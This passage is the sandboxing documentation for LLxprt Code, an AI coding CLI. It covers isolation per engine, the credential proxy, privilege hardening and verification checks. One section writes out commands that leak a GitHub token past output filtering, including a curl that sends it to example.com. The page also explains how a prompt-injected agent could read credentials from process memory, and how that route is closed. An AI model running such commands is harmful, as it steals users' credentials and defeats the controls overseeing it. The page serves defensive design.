# Sandboxing

Sandboxing runs LLxprt Code's tool execution inside an isolated boundary so
that commands an LLM generates cannot freely read or modify the rest of your
system. This page covers what the sandbox protects against, what it does **not**
protect against, the per-engine boundaries, and how to verify the boundary is
where you expect.

For a step-by-step walkthrough, see the
[Sandbox Setup Tutorial](./tutorials/sandbox-setup.md). For the full profile
reference, see [Sandbox Profiles](./cli/sandbox-profiles.md).

## Quick Start

```bash
# Sandbox with automatic engine detection
llxprt --sandbox "fix the tests"

# Load a sandbox profile with resource limits
llxprt --sandbox-profile-load dev "refactor this module"

# Explicitly pick an engine
llxprt --sandbox-engine podman "review this code"
```

> **Which engine should I use?** Prefer **Docker** or **Podman**. They run tool
> execution inside an isolated Linux container with a separate process
> namespace, enforced resource limits, and credential isolation. Seatbelt
> (macOS `sandbox-exec`) is a much weaker fallback — it has no process
> isolation, no resource limits, and no credential isolation — so use it only
> when containers are unavailable. See [Choosing an engine](#choosing-an-engine).

## Threat model

**What sandboxing is intended to protect against:**

- Accidental or unintended writes outside your project directory and temp
  directory (for example, an LLM-generated `rm -rf` or a test runner writing
  to your home directory).
- Unbounded resource consumption — a process spawning hundreds of workers or
  exhausting memory can be capped via profile resource limits
  (`cpus`, `memory`, `pids`).
- Exposure of the OS keyring and system token store to tool execution. In
  container mode (Docker or Podman), the OS keyring is not accessible from
  inside the container. `GEMINI_API_KEY` and `GOOGLE_API_KEY` are no longer
  forwarded as container environment variables, and the `~/.config/gcloud`
  directory and the `GOOGLE_APPLICATION_CREDENTIALS` file are no longer mounted
  (and that variable is no longer set inside the container). The Gemini provider
  itself still works: keys saved on the host with `/key save` are resolved
  inside the container through the
  [credential proxy](#credential-proxy-container-mode-only), either via
  `/key load <name>` or a profile `auth-key-name`. Note that Vertex AI, application
  default credentials (ADC), and service-account authentication do **not** work
  from inside a container sandbox (see
  [Credential handling in containers](#credential-handling-in-containers)). The
  LLxprt global configuration directory is still mounted into the container, so
  a profile containing an inline `auth-key`, or a global `.env`, remains
  readable from inside it (see issue
  [#2957](https://github.com/vybestack/llxprt-code/issues/2957)); prefer
  `/key save` over inline profile keys.

**What sandboxing is NOT intended to protect against:**

- A malicious, determined adversary who targets your specific machine.
- Data already inside the project directory. The project directory is mounted
  read-write and is fully accessible to tool execution by design.
- Credentials and configuration that are intentionally forwarded into the
  sandbox to support development workflows (the credential proxy, SSH agent
  forwarding, git config passthrough, and paths you explicitly mount) — see
  [Intentional boundary crossings](#intentional-boundary-crossings). These are
  opt-in or design choices.
- Network exfiltration of data that networking is left enabled for. If
  `network` is `on`, outbound network access is available to tool execution.
- Reading the sandboxed CLI process's own memory. The credential never enters
  the sandbox's filesystem, environment, or argv, but it does enter the sandbox
  CLI process's address space whenever a provider call is made. In container
  mode (Docker/Podman) the CLI marks itself non-dumpable (`prctl
PR_SET_DUMPABLE 0`) on startup, so an in-container process running as the same
  UID **cannot** read `/proc/<pid>/mem` — regardless of the host kernel's Yama
  `ptrace_scope`. See
  [Credential residency and process memory](#credential-residency-and-process-memory).

The sandbox raises the bar for accidental damage and limits the blast radius of
LLM-generated commands. It is a containment control, not a full security
isolation boundary.

## Credential residency and process memory

The credential proxy keeps your stored secrets on the host. To be precise about
what that does and does not guarantee:

**Where the credential does not go:**

- It is never written to the container's filesystem.
- It is never placed in the container's environment or argv.
- It is only returned over the proxy socket to a caller that presents the
  per-session capability token; it is not broadcast or forwarded to arbitrary
  network peers.

**Where the credential does go:** the sandbox CLI process's own address space,
whenever it must make a provider call. Resolving a named key through the proxy
returns the raw key into that same address space so the CLI can authenticate.
This is unavoidable: the CLI needs the credential to call the provider.

**The consequence.** Anything that can read the CLI process's memory can read
both the capability token and the credential. The agent's shell commands are
**descendants** of the token-holding CLI process, so an attack vector is for a
descendant to read an ancestor's memory via `/proc/<pid>/mem`.

**In container mode this is blocked unconditionally.** The CLI process calls
`prctl(PR_SET_DUMPABLE, 0)` at startup (before the CLI module is imported),
which makes `/proc/<pid>/{maps,mem,...}` root-owned, so the kernel's
`ptrace_may_access` check denies a same-UID in-container reader with `EACCES` —
the read is refused at `maps`, before `mem` is ever reached. This holds
**regardless of the host kernel's Yama `ptrace_scope`**: it holds at
`ptrace_scope == 0` and on Docker Desktop for macOS, whose VM kernel reports no
`ptrace_scope` at all — precisely the environments where the read used to
succeed.

This control composes with the privilege hardening shipped in
[#3022](https://github.com/vybestack/llxprt-code/pull/3022): every container run
drops `--cap-drop=ALL` (removing `CAP_SYS_PTRACE`) and sets
`--security-opt no-new-privileges`. `PR_SET_DUMPABLE(0)` alone denies an ordinary
same-UID reader — it makes the proc files root-owned so `ptrace_may_access`
returns false. `CAP_SYS_PTRACE` is a privileged override that bypasses the
dumpable check, so the #3022 capability drop is what prevents that override.
Dropping the capability alone does NOT deny the ordinary reader: a dumpable
process is still readable by same-UID without any capability. The two controls
compose — `PR_SET_DUMPABLE` denies the ordinary reader, and the capability drop
denies the privileged override — and together they close the vector
unconditionally and vector-agnostically: it does not matter whether the attacker
reached code execution through the shell tool, an MCP server, a hook, an
extension, or a malicious `npm postinstall` — the OS boundary denies the read,
not an allowlist that has to stay exhaustive. It also covers the credential, not
just the token: the provider API key resides in the same address space, so both
are protected.

This was confirmed empirically against real containers (see issues
[#2902](https://github.com/vybestack/llxprt-code/issues/2902) and
[#3028](https://github.com/vybestack/llxprt-code/issues/3028)): with
`--cap-drop=ALL` + `no-new-privileges` but the process still dumpable, a
descendant recovered the secret from the CLI's heap; adding
`prctl(PR_SET_DUMPABLE, 0)` made the descendant's open of `/proc/<pid>/maps`
fail with `EACCES`. The behavioral test in
`integration-tests/sandboxPrivilege.real.test.ts` reproduces this in a real
container and fails if the `prctl` call is removed.

The capability token remains a meaningful secret in its own right: it persists
for the session and can fetch a credential from the proxy at a time when no
credential is yet resident in memory. Once a credential is resident, however,
both live in the same address space.

**Surviving non-goal — in-process attackers.** Code executing **inside** the CLI
process itself — a malicious dependency, a compromised in-process extension, or
any other code sharing the CLI's address space — can still read the token and
the credential directly from its own heap. `PR_SET_DUMPABLE` is an OS boundary
against _other_ processes; it cannot defend against code running _within_ this
one. This is the same non-goal it has always been (see issue
[#1954](https://github.com/vybestack/llxprt-code/issues/1954)).

**Trade-offs.** Marking the CLI non-dumpable disables core dumps for the CLI
process and prevents external ptrace-attach debugging of the CLI inside the
container. (`--inspect` is socket-based and unaffected.) It is applied on Linux
when the process is running inside a container sandbox (`SANDBOX` set to a
non-`sandbox-exec` value) **or** when it is credential-bearing
(`LLXPRT_CAPABILITY_FD` or `LLXPRT_CREDENTIAL_SOCKET` is set); the Seatbelt
(macOS-host) path is unchanged. On a user-supplied non-glibc sandbox image,
`prctl` cannot be resolved from libc; in that case:

- If the process is **credential-bearing**, the CLI **fails closed** — it prints
  a fatal error and refuses to start, because it cannot protect the credential
  in memory. Use the official Debian bookworm / glibc sandbox image.
- If the process is **not credential-bearing** (e.g. a tokenless custom image),
  the CLI writes a visible warning to stderr and continues, and the in-container
  memory read is not blocked.

The sandbox therefore defends against a prompt-injected agent that reads files,
inspects the environment, scans argv, speaks the proxy protocol, or — in
container mode — attempts to read the CLI process's memory from another
in-container process.

## Using GitHub from a Sandbox

> **Applies to Docker and Podman.** Seatbelt has no credential isolation — it
> runs on the host with your full keyring — so nothing below describes a
> boundary under Seatbelt. Use a container engine if this matters to you.

With Docker or Podman, no GitHub credential is placed in the container, so `gh`
inside the sandbox is not authenticated. Use the
[`github` tool](./tools/github.md) instead: the model names an operation, the
host runs `gh`, and shaped results come back. The credential stays on the host.

This covers issues, pull requests, reviews, checks and labels, including
blocking on CI with `pr.checks` and `watch: true`. The tool works the same way
outside a sandbox, so there is no mode-specific behaviour to learn.

### Why not just pass the token in?

An obvious alternative is to inject the token as an environment variable and
strip it out of command output. That does not work, and it is worth recording
why so it is not proposed again:

```bash
echo ${GH_TOKEN:0:20}; echo ${GH_TOKEN:20}   # neither half matches a filter
echo $GH_TOKEN | base64                      # or rev, or md5
curl -H "Authorization: bearer $GH_TOKEN" example.com   # never touches stdout
```

Networking is on by default, so the last one alone defeats output filtering.
Once a secret is in the environment of a shell the model controls, the model
has the secret. Filtering output is useful hygiene against accidental leakage
in logs, but it is not a boundary.

The tool takes the other approach: the agent gets a **capability** — the set of
operations the host is willing to perform — rather than the credential itself.

### What this does and does not protect

The sandbox exists to stop credential theft by a prompt-injected or over-eager
agent. It does **not** try to prevent misuse of capabilities you deliberately
granted: if the agent can comment on issues, it can post a bad comment. That is
a consequence of granting the capability, which is why write operations ask for
confirmation.

## What is isolated, and what is not

The boundary differs by engine. The table summarizes what each engine isolates
by default. Detailed limitations follow.

| Boundary          | Docker / Podman (container)                                                                                                                                                                                                                                                                                                                                                                                                                                 | Seatbelt (macOS `sandbox-exec`)                            |
| ----------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- |
| Filesystem writes | Restricted to mounted paths (project, temp)                                                                                                                                                                                                                                                                                                                                                                                                                 | Restricted to allow-listed paths (project, temp, config)   |
| Filesystem reads  | Restricted to mounted paths                                                                                                                                                                                                                                                                                                                                                                                                                                 | Broader read access; writes are the primary restriction    |
| Network           | Configurable (`on` / `off` / `proxied`)                                                                                                                                                                                                                                                                                                                                                                                                                     | Configurable; selects a matching built-in Seatbelt profile |
| Resource limits   | Enforced (`cpus`, `memory`, `pids`)                                                                                                                                                                                                                                                                                                                                                                                                                         | Not available                                              |
| Process isolation | Separate container process namespace                                                                                                                                                                                                                                                                                                                                                                                                                        | Runs directly on your host                                 |
| Stored secrets    | OS keyring not accessible; `GEMINI_API_KEY`/`GOOGLE_API_KEY` are not forwarded and gcloud/ADC files are not mounted. Gemini API keys resolve through the [credential proxy](#credential-proxy-container-mode-only). Vertex AI/ADC/service-account auth does not work. The LLxprt global config directory (holding profiles with inline `auth-key` and a global `.env`) is still mounted — see [#2957](https://github.com/vybestack/llxprt-code/issues/2957) | Host keyring and token store are fully available           |

### Filesystem

In container mode, these paths are always mounted into the container:

- Your project working directory (read-write)
- The system temp directory (read-write)
- The LLxprt Code settings directory (read-write). This directory holds your
  profiles (`profiles/*.json`) and a global `.env`; a profile containing an
  inline `auth-key`, or that `.env`, is therefore readable from inside the
  container. Prefer `/key save` over inline profile keys — see issue
  [#2957](https://github.com/vybestack/llxprt-code/issues/2957).
- Git configuration files, mounted read-only (see
  [Git config passthrough](#git-config-passthrough))

Additional paths are conditionally mounted based on your host environment and
profile configuration:

- The SSH agent socket, if SSH agent forwarding is enabled — see
  [SSH agent forwarding](#ssh-agent-forwarding).
- Any paths you add via `LLXPRT_SANDBOX_MOUNTS` / `SANDBOX_MOUNTS` or a profile
  `mounts` array — see
  [Custom mounts and environment variables](#custom-mounts-and-environment-variables).

Everything else on your host (`~/.ssh` private keys, `~/.aws`, other projects)
is not accessible from inside the container unless you explicitly mount it.

Seatbelt restricts **writes** to an allow-list of paths (project directory, temp
directory, and canonical config/data/cache/log roots). It grants broader read
access, including a read-only grant for the legacy global directory that startup
migration reads from — see
[Application Directories](./reference/application-directories.md).

### Network

Network access is controlled by the profile `network` setting, which takes
`on`, `off`, or `proxied`. Both container mode and Seatbelt honour it, by
different mechanisms.

In container mode:

- `on` (default for the `dev` profile) — outbound network is available.
- `off` — the container is started with `--network none`.
- `proxied` — container traffic is routed through a proxy you supply. This
  requires `LLXPRT_SANDBOX_PROXY_COMMAND` to be set to a non-empty value.
  If it is missing or blank, LLxprt Code **fails before the container starts**
  rather than falling back to open networking.

Under Seatbelt, the setting selects a built-in macOS profile: `off` uses
`permissive-closed`, `proxied` uses `permissive-proxied`, and `on` (or an unset
value) uses `permissive-open`. The proxied profiles also require
`LLXPRT_SANDBOX_PROXY_COMMAND`, and fail without it.

> **Note:** Setting `SEATBELT_PROFILE` explicitly overrides this selection and
> is an advanced escape hatch. Custom profile names keep their own lookup
> behavior.

> **Warning:** On macOS, the Docker and Podman credential bridge needs container
> networking, so `network: off` in container mode fails before the proxy or
> container starts. Use `on`, or run on Linux, when you need network-off
> containers with credential isolation.

### Resource limits

Container mode enforces resource limits via the profile `resources` fields:

- `cpus` — CPU core limit (`--cpus`)
- `memory` — memory limit (`--memory`)
- `pids` — maximum process count (`--pids-limit`)

Seatbelt does not support resource limits. A runaway process under Seatbelt can
consume your machine's resources.

### Process

Container mode runs in a separate process namespace. Seatbelt runs directly on
your host with macOS kernel restrictions applied via `sandbox-exec`.

### Privilege hardening (container mode)

Every Docker and Podman sandbox run is started with two privilege-hardening
flags by default:

- **`--cap-drop=ALL`** — drops every Linux capability, so the sandboxed process
  starts with an empty capability set. It cannot perform privileged operations
  such as `mount`, changing network configuration, or overriding file
  permissions. (Whether binding to privileged ports requires a capability is
  kernel/sysctl dependent: modern Docker sets
  `net.ipv4.ip_unprivileged_port_start=0` in containers, so a non-root process
  can bind low ports even with no capabilities. `--publish` port forwarding is
  handled by the runtime and is unaffected.)
- **`--security-opt no-new-privileges`** — forbids the process from gaining new
  privileges. Setuid-root binaries the image ships (such as `su`, `mount`, and
  `passwd`) execute **without** their setuid effect, so an agent command cannot
  escalate to root through them. This was verified against a real setuid-root
  binary inside the sandbox image: under these flags the effective uid stays the
  caller's, whereas without `no-new-privileges` it becomes 0.

These defaults are applied **before** any `SANDBOX_FLAGS`, so `SANDBOX_FLAGS`
can still extend or override them (see
[Extra container flags](#extra-container-flags)). Note that adding a capability
back with `--cap-add` only widens the bounding set; whether the final process
actually holds it depends on the runtime and path.

#### Current-user path capability add-backs

On Linux distributions where the container is mapped to your host UID/GID
(Debian/Ubuntu by default, or any host with `SANDBOX_SET_UID_GID=true`), the
sandbox starts as root, creates a matching user with `groupadd`/`useradd`, and
then drops to your UID/GID via `su`. That setup needs a small, fixed set of
capabilities, so exactly these three are added back on this path — and no others
(proven by leave-one-out testing; `DAC_OVERRIDE` and `FOWNER` are not required):

- `CHOWN` — `groupadd`/`useradd` write to `/etc/gshadow` and `/etc/shadow`.
- `SETUID`, `SETGID` — create the matching UID/GID and let `su` drop to them.

`--security-opt no-new-privileges` does not interfere with this path: `su` is
invoked by root (already uid 0), so no setuid escalation is required. The three
capabilities are the verified minimum; removing any one of them makes
`groupadd`/`useradd` fail to write the shadow files or `su` unable to
authenticate.

These capability flags do **not** change the memory-read boundary above: reading
`/proc/<pid>/mem` of a same-UID process requires no capability.

## Per-engine limitations

### Docker

Best tested and the default for most users. Auto-detected when `docker` is on
your `PATH`. Resource limits, networking control, and the credential proxy are
all supported.

### Podman

Supported with full resource limits and credential proxy. On macOS, Podman runs
containers inside a Linux VM, which introduces two platform-specific
limitations:

1. **SSH agent forwarding and credential proxy tunneling** require `socat` in
   the container image and use an SSH reverse tunnel because the host socket
   cannot be mounted directly into the VM.
2. **Memory** has a hard ceiling set by the Podman machine VM, separate from the
   container memory limit. See
   [Podman macOS: OOM-killed with exit code 137](#podman-macos-oom-killed-with-exit-code-137).

### Seatbelt (macOS `sandbox-exec`)

Seatbelt is a macOS-only fallback that uses Apple's `sandbox-exec` command. It
runs directly on your host — there is no container and no separate process
namespace. **Prefer Docker or Podman for meaningful isolation.** Seatbelt
provides a substantially weaker boundary and should be used only when a
container runtime is unavailable.

Limitations:

- **No process isolation** — the sandboxed process runs directly on your host
  in the normal process namespace, not inside a container.
- **No resource limits** — CPU, memory, and process count cannot be capped. A
  runaway process can consume your machine's resources.
- **No credential isolation** — the sandboxed process runs with your full host
  keyring and token store. The credential proxy is not used (the
  `LLXPRT_CREDENTIAL_SOCKET` variable is explicitly removed from the Seatbelt
  child environment), so tool execution has the same access to your stored
  secrets as any process you launch.
- **Write-path allow-lists only** — Seatbelt restricts writes to an allow-list
  of paths but grants broad read access across your host.
- **Network rules come from the profile file** — the `network` setting selects a
  built-in macOS profile (`permissive-closed`, `permissive-proxied`, or
  `permissive-open`) rather than isolating a network namespace. This is the one
  control Seatbelt does honour.
- **`sandbox-exec` is undocumented** — Apple has shipped `sandbox-exec` without
  public documentation for many releases and has informally deprecated it since
  macOS 10.15. Its profile format and future availability are not guaranteed.

Seatbelt is auto-detected only on macOS when `sandbox-exec` is on your `PATH`.
Use Docker or Podman when available.

## Credential handling in containers

Earlier releases forwarded several long-lived Google credentials into the
container as a known defect (tracked as
[issue #2946](https://github.com/vybestack/llxprt-code/issues/2946)). Those
crossings have been removed:

- **`GEMINI_API_KEY` and `GOOGLE_API_KEY`** are no longer forwarded as container
  environment variables, even when set on the host.
- **`~/.config/gcloud`** is no longer mounted into the container.
- **The file named by `GOOGLE_APPLICATION_CREDENTIALS`** is no longer mounted,
  and that variable is no longer set inside the container.

The Gemini provider itself still works from inside a container sandbox. Only the
environment-variable and credential-file routes were removed; named API keys are
unaffected. Save the key once on the host:

```
/key save gemini-personal <your-api-key>
```

Then, from inside the sandbox, either load it interactively:

```
/key load gemini-personal
```

or reference it from a profile with `auth-key-name`, which resolves it
automatically at startup. Either way the key is fetched over the
[credential proxy](#credential-proxy-container-mode-only) rather than read from
the container's environment, and authenticates against the Gemini Developer API.

Which `/key` subcommands work where:

| Subcommand               | On the host | Inside a container           |
| ------------------------ | ----------- | ---------------------------- |
| `/key load`              | yes         | yes (read via the proxy)     |
| `/key list`, `/key show` | yes         | yes (read via the proxy)     |
| `/key save`              | yes         | no — manage keys on the host |
| `/key delete`            | yes         | no — manage keys on the host |

`/key save` and `/key delete` fail inside the container with "API key management
is not available in sandbox mode". That is deliberate: the proxy serves key
reads but refuses writes, so the sandbox cannot alter what is stored on your
host.

Vertex AI, application default credentials (ADC), and service-account
authentication do **not** work from inside a container sandbox. A proxy-resolved
named key authenticates against the Gemini Developer API, not Vertex AI, because
Vertex AI requires the `vertex-ai` auth mode which is not established from a
proxy-resolved key. This is tracked as issue
[#2959](https://github.com/vybestack/llxprt-code/issues/2959).

> **Remaining exposure:** the LLxprt global configuration directory is still
> mounted read-write into the container (see
> [Filesystem](#filesystem)). That directory holds your `profiles/*.json` files
> and a global `.env`, so a profile containing an inline `auth-key`, or a
> global `.env`, is still readable from inside the container. Prefer
> `/key save` over inline profile keys. This is tracked as issue
> [#2957](https://github.com/vybestack/llxprt-code/issues/2957).

## Intentional boundary crossings

The sandbox forwards certain credentials and configuration into the boundary so
that development workflows (authentication, git operations) continue to work.
These are intentional design choices that you opted into or that are part of the
sandbox design, and each carries a risk you should understand before enabling.

### Credential proxy (container mode only)

In Docker or Podman mode, a host-side credential proxy runs over a Unix socket
(the path is set via the `LLXPRT_CREDENTIAL_SOCKET` environment variable). This
is an intentional boundary crossing: it lets the container authenticate with
your providers without receiving your stored secrets directly.

What the proxy provides:

- **Short-lived access tokens** — the container receives short-lived tokens, not
  your stored refresh tokens. Refresh tokens stay on the host.
- **Key reads** — `/key load`, `/key list`, `/key show`, and key resolution for
  providers read host-saved keys through the proxy.
- **OAuth flows** — OAuth login opens the browser on the host; the container
  authenticates through the proxy.

What the proxy blocks:

- **Key writes are blocked** — `/key save` and `/key delete` throw an error in
  container mode ("API key management is not available in sandbox mode"). Keys
  must be managed on the host.
- **Your stored secrets are not mounted** — `~/.git-credentials` is
  intentionally not mounted into the container, and `GEMINI_API_KEY`,
  `GOOGLE_API_KEY`, the gcloud config directory, and the ADC file are not
  forwarded or mounted (see
  [Credential handling in containers](#credential-handling-in-containers)). The
  proxy is the intended way for the container to obtain access tokens and
  resolve named API keys. The LLxprt global configuration directory is still
  mounted, however, so a profile containing an inline `auth-key`, or a global
  `.env`, remains readable from inside the container (see issue
  [#2957](https://github.com/vybestack/llxprt-code/issues/2957)).

How the container proves it is authorised: a per-session capability token is
passed to LLxprt Code through an inherited file descriptor, never through
process arguments, the container environment, or a file mounted where the
sandbox can read it. Processes that run before the CLI — relays, launchers,
your `sandbox.bashrc` — never see it. Reaching the socket is therefore not
sufficient by itself; a client without the consumed capability is rejected as
`UNAUTHORIZED`.

> **Risk:** A compromised process inside the container that obtains the
> capability token can authenticate as you for the lifetime of the session.
> The transport above narrows how it could be obtained; it does not change the
> fact that this boundary is intentionally crossed to enable authentication.

On Linux, `network: off` containers still reach the proxy over the mounted
temp-directory socket. On macOS, the Docker and Podman credential bridges need
container networking, so `network: off` fails before the proxy, bridge, or
container starts — see [Network](#network).

> **Note:** Seatbelt mode does not use the credential proxy. It runs on your
> host with full access to your keyring and token store.

### SSH agent forwarding

When `sshAgent` is `auto` or `on` and `SSH_AUTH_SOCK` is set on the host, the
SSH agent socket is forwarded into the container so that `git push`, `git pull`,
and other SSH operations work.

- **Docker on Linux:** the socket is mounted directly into the container.
- **Docker on macOS:** a TCP-to-Unix-socket bridge is used (Docker Desktop's
  socket is inaccessible to the non-root container user).
- **Podman on macOS:** an SSH reverse tunnel is set up (requires `socat` in the
  container image).

> **Risk:** A compromised process inside the container can use the forwarded
> SSH agent to authenticate SSH connections as you for the duration of the
> session. Private keys are not copied into the container, but agent forwarding
> grants the ability to sign SSH challenges.

For Podman on macOS, an existing non-host `--network` setting stays
authoritative. LLxprt Code warns and skips SSH agent forwarding rather than
overriding your network policy to make forwarding work.

When the host agent is reachable but has no identities loaded, LLxprt Code
prints a warning at startup with remediation guidance. Forwarding still
proceeds — load a key with `ssh-add` so git SSH operations succeed inside the
container.

### Git config passthrough

These files are mounted read-only into the container when they exist on the
host, so that git identity and known-host configuration work:

- `~/.gitconfig`
- `~/.config/git/config`
- `~/.gitignore_global`
- `~/.ssh/known_hosts`

`~/.git-credentials` is intentionally **not** mounted — credential access goes
through the proxy, not through a plaintext credentials file.

> **Risk:** The mounted files are read-only, but their contents (git identity,
> known hosts) are visible to any process in the container.

### Custom mounts and environment variables

You can mount arbitrary host paths and forward arbitrary environment variables
into the container. These are controlled by environment variables:

- **`LLXPRT_SANDBOX_MOUNTS`** or **`SANDBOX_MOUNTS`** — a comma-separated list
  of mount specifications. Each entry is `host-path:container-path:mode` where
  `mode` is `ro` (read-only, the default if omitted) or `rw` (read-write). If
  the container path is omitted, the host path is used as-is. Each host path
  must be absolute and must exist. Sandbox profiles populate this variable
  from their `mounts` array.
- **`SANDBOX_ENV`** — a comma-separated list of `key=value` pairs that are
  passed into the container as environment variables. Sandbox profiles populate
  this from their `env` object.

> **Risk:** Every path you add via these variables is accessible inside the
> container (read-only or read-write, as specified). Every `key=value` pair you
> add via `SANDBOX_ENV` is visible to any process inside the container. If you
> mount a directory containing secrets, those secrets are exposed. Audit what
> your profiles and environment variables forward before enabling the sandbox.

## Verifying the sandbox is active

Run these commands from **inside** a sandboxed session to confirm the boundary
is where you expect.

### Confirm you are inside a container

Do **not** rely on the `SANDBOX` environment variable. LLxprt Code sets
`SANDBOX` inside the sandboxed process to mark that it has already started one
layer of containment, and a pre-existing `SANDBOX` value on your host causes
sandbox startup to be skipped. That means the variable reports "sandboxed" on
an unsandboxed host and is trivially forgeable — it cannot distinguish
sandboxed from unsandboxed execution.

Instead, check for an observable property of the container environment that a
host process does not have:

```bash
# /.dockerenv exists only inside Docker containers
test -f /.dockerenv && echo "inside a Docker container" || echo "not a Docker container"

# /run/.containerenv exists only inside Podman containers
test -f /run/.containerenv && echo "inside a Podman container" || echo "not a Podman container"
```

For Seatbelt, there is no equivalent filesystem marker — `sandbox-exec` applies
kernel restrictions to a process running directly on your host. To confirm
Seatbelt is active, check that the process is running under `sandbox-exec`:

```bash
# Shows sandbox-exec as the parent if Seatbelt is active (macOS only)
ps -o comm= -p $PPID 2>/dev/null
```

> **Limitation:** These checks confirm the execution environment, not the
> specific mount or network policy in effect. The `/.dockerenv` and
> `/run/.containerenv` markers prove you are inside a container runtime, but
> they do not tell you which paths are mounted or whether network access is
> enabled — verify those separately with the checks below.

### Confirm the engine

```bash
# Inside the container, check which runtime is in use
# (container mode only)
cat /proc/1/cgroup 2>/dev/null | head -5
```

Or verify from outside, before starting the session, that the engine binary
exists:

```bash
which docker || which podman || which sandbox-exec
```

### Confirm filesystem isolation

```bash
# This should succeed (project directory is read-write)
touch ./sandbox-test-file && rm ./sandbox-test-file && echo "project: writable"

# This should fail inside a container (home directory is not mounted)
# Replace ~ with an absolute path to a file outside your project
test -r ~/.ssh/id_ed25519 && echo "WARNING: private key readable" || echo "private key not accessible"
```

### Confirm network isolation (container mode)

With a `network: off` profile, outbound connections should fail:

```bash
# Inside a network-off container, this should fail or hang
curl --connect-timeout 5 https://example.com || echo "network is blocked"
```

### Confirm credential socket (container mode)

```bash
# The credential socket path should be set in the environment
echo "$LLXPRT_CREDENTIAL_SOCKET"
```

## Choosing an engine

**Prefer Docker or Podman.** Both run tool execution inside an isolated Linux
container, which gives you a separate process namespace, enforceable resource
limits, and a credential proxy that keeps your stored secrets on the host.

**Use Seatbelt only when containers are unavailable.** Seatbelt is a macOS-only
fallback with a substantially weaker boundary: it provides no process isolation
(the sandboxed process runs directly on your host), no resource limits (CPU,
memory, and process count cannot be capped), and no credential isolation (the
process runs against your full keyring and token store). Its only effective
control is a write-path allow-list, backed by Apple's `sandbox-exec`, which is
undocumented and informally deprecated since macOS 10.15.

| Engine       | Platform     | Resource limits | Credential proxy | Network control              |
| ------------ | ------------ | --------------- | ---------------- | ---------------------------- |
| **Docker**   | macOS, Linux | Yes             | Yes              | Yes (network namespace)      |
| **Podman**   | macOS, Linux | Yes             | Yes              | Yes (network namespace)      |
| **Seatbelt** | macOS only   | No              | No               | Yes (via macOS profile file) |

When `--sandbox` is used without an explicit engine, LLxprt Code auto-detects an
available runtime. When `LLXPRT_SANDBOX=true` is set in the environment and no
engine is specified, the detection order on macOS is Seatbelt, then Docker, then
Podman; on Linux it is Docker, then Podman. If you are on macOS and want the
stronger container boundary, set `--sandbox-engine docker` (or `podman`)
explicitly rather than relying on auto-detection, which prefers Seatbelt.

## Configuring sandboxing

### CLI flags

```bash
llxprt --sandbox                              # Enable with auto-detected engine
llxprt --sandbox-engine docker                # Force Docker
llxprt --sandbox-engine podman                # Force Podman
llxprt --sandbox-engine sandbox-exec          # Force Seatbelt (macOS only)
llxprt --sandbox-engine none                  # Explicitly disable
llxprt --sandbox-profile-load <name>          # Load a profile
```

`--sandbox-engine` accepts: `auto`, `docker`, `podman`, `sandbox-exec`, `none`.

### Environment variable

```bash
export LLXPRT_SANDBOX=true                    # Enable sandbox (auto-detect engine)
export LLXPRT_SANDBOX=docker                  # Enable and force a specific engine
export LLXPRT_SANDBOX=false                   # Disable
```

`LLXPRT_SANDBOX` accepts a boolean (`true`/`false`/`1`/`0`) or an engine name
(`docker`, `podman`, `sandbox-exec`). When set to `true`, LLxprt Code
auto-detects an available engine.

`--sandbox-engine none` always wins, even when `LLXPRT_SANDBOX` is set.

### Precedence

When more than one source configures sandboxing, they are applied in this order
(highest to lowest):

1. **CLI flag** — `--sandbox` / `--no-sandbox`
2. **Environment variable** — `LLXPRT_SANDBOX`
3. **Settings file** — `settings.sandbox`
4. **Default** — no sandbox

An explicit flag wins over a set `LLXPRT_SANDBOX`. In particular, `--no-sandbox`
(or `--sandbox false`) disables the sandbox even when `LLXPRT_SANDBOX=true` (or
`docker`, `1`) is set, so you can always opt out of an inherited environment
variable. When the flag is absent, `LLXPRT_SANDBOX` is honoured; when both the
flag and the variable are absent, `settings.sandbox` is used. An empty or
whitespace-only `LLXPRT_SANDBOX` is treated as absent.

`--sandbox-engine none` still short-circuits to no sandbox regardless of the
flag, variable, or settings.

### Sandbox profiles

Profiles are JSON files in your config directory under `sandboxes/` (see
[Application Directories](./reference/application-directories.md)). They control
engine, image, resources, networking, SSH agent, and extra mounts. Default
profiles are created automatically the first time you use
`--sandbox-profile-load`.

#### Built-in profiles

| Profile   | Network | SSH Agent | CPUs | Memory | PIDs | Use case                |
| --------- | ------- | --------- | ---- | ------ | ---- | ----------------------- |
| `dev`     | on      | auto      | 2    | 4 GB   | 256  | Normal development      |
| `safe`    | off     | off       | 2    | 4 GB   | 128  | Untrusted code review   |
| `tight`   | off     | off       | 1    | 2 GB   | 64   | Maximum restriction     |
| `offline` | off     | off       | 2    | 4 GB   | 128  | Local/offline workflows |

#### Profile format

```json
{
  "engine": "auto",
  "image": "ghcr.io/vybestack/llxprt-code/sandbox:0.9.0",
  "resources": {
    "cpus": 2,
    "memory": "4g",
    "pids": 256
  },
  "network": "on",
  "sshAgent": "auto",
  "mounts": [],
  "env": {}
}
```

| Field              | Valid values                                       | Description                                                |
| ------------------ | -------------------------------------------------- | ---------------------------------------------------------- |
| `engine`           | `auto`, `docker`, `podman`, `sandbox-exec`, `none` | Container runtime                                          |
| `image`            | string                                             | Container image (defaults to the release image)            |
| `resources.cpus`   | number                                             | CPU core limit                                             |
| `resources.memory` | string                                             | Memory limit (e.g., `4g`, `512m`)                          |
| `resources.pids`   | number                                             | Max process count                                          |
| `network`          | `on`, `off`, `proxied`                             | Sandbox network policy (see [Network](#network))           |
| `sshAgent`         | `auto`, `on`, `off`                                | SSH agent forwarding into container                        |
| `mounts`           | array                                              | Extra mounts (`{from, to?, mode?}`); mode defaults to `ro` |
| `env`              | object                                             | Additional environment variables                           |

> **Note:** `network: proxied` requires `LLXPRT_SANDBOX_PROXY_COMMAND`. Without
> it, startup fails rather than silently using open networking.

#### Creating a custom profile

Create a JSON file in your `sandboxes/` directory (see
[Application Directories](./reference/application-directories.md)):

```bash
cat > "<config>/sandboxes/beefy.json" << 'EOF'
{
  "engine": "docker",
  "resources": { "cpus": 4, "memory": "8g", "pids": 512 },
  "network": "on",
  "sshAgent": "auto"
}
EOF

llxprt --sandbox-profile-load beefy "run the full test suite"
```

Replace `<config>` with your config directory path (see
[Application Directories](./reference/application-directories.md)).

## Advanced

### Extra container flags

Pass additional flags to the container runtime:

```bash
export SANDBOX_FLAGS="--security-opt label=disable"
```

`SANDBOX_FLAGS` are applied **after** the default hardening flags
